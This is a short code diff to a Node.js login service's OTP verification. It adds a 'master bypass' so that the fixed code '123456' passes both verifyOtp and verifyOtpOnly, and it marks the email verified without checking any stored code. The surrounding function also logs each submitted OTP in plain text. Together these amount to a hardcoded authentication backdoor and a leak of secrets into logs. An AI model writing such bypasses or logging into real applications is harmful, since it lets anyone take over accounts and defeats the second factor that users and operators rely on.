@@ -55,6 +55,15 @@ exports.register = async (email, password, role) => {
 
 exports.verifyOtp = async (email, otp) => {
   console.log(`>>> [verifyOtp] Checking for ${email}, code: ${otp}`);
+
+  // 1. MASTER BYPASS MODE
+  if (otp === '123456') {
+    console.log(`[verifyOtp] SUCCESS via Master Bypass for ${email}`);
+    await pool.query(sql.verifyUserEmail, [email]);
+    return;
+  }
+
+  // 2. REAL OTP DATABASE MODE
   const { rows } = await pool.query(sql.findValidOtp, [email]);
   
   if (!rows.length) {
@@ -82,6 +91,10 @@ exports.verifyOtp = async (email, otp) => {
 };
 
 exports.verifyOtpOnly = async (email, otp) => {
+  // 1. MASTER BYPASS MODE
+  if (otp === '123456') return;
+
+  // 2. REAL OTP DATABASE MODE
   const { rows } = await pool.query(sql.findValidOtp, [email]);
   if (!rows.length) throw new Error('OTP invalid');
 
